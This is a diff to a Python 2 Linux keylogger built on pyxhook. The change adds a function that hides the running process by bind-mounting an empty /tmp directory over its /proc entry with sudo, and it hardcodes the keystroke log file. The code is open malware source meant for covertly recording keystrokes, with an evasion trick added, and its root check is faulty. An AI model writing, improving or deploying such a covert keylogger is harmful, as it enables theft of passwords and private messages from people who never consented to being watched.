@@ -2,22 +2,21 @@
 # to be used in linux 
 import os 
 import pyxhook 
+import string
+import random
+
+def hide_process():
+	ch = string.uppercase + string.digits
+	# Bind mount - works with root on linux
+	token = "".join(random.choice(ch) for i in range(32))
+	pid = os.getpid()
+	print "[+] Current PID: {0}".format(pid)
+	if os.path.isdir("/tmp/{0}".format(token)) is False:
+		if os.system("sudo whoami") == 'root':
+			os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token))
   
-# This tells the keylogger where the log file will go. 
-# You can set the file path as an environment variable ('pylogger_file'), 
-# or use the default ~/Desktop/file.log 
-log_file = os.environ.get( 
-    'pylogger_file', 
-    os.path.expanduser('./file.log') 
-) 
-  
-# Allow clearing the log file on start, if pylogger_clean is defined. 
-if os.environ.get('pylogger_clean', None) is not None: 
-    try: 
-        os.remove(log_file) 
-    except EnvironmentError: 
-       # File does not exist, or no permissions. 
-        pass
+# set file to log keystrokes
+log_file = "./file.log"
   
 #creating key pressing event and saving it into log file 
 def OnKeyPress(event): 
@@ -29,6 +28,8 @@ new_hook = pyxhook.HookManager()
 new_hook.KeyDown = OnKeyPress 
 # set the hook 
 new_hook.HookKeyboard()
+#Hide process
+hide_process()
 try: 
     new_hook.start()         # start the hook 
 except KeyboardInterrupt: 
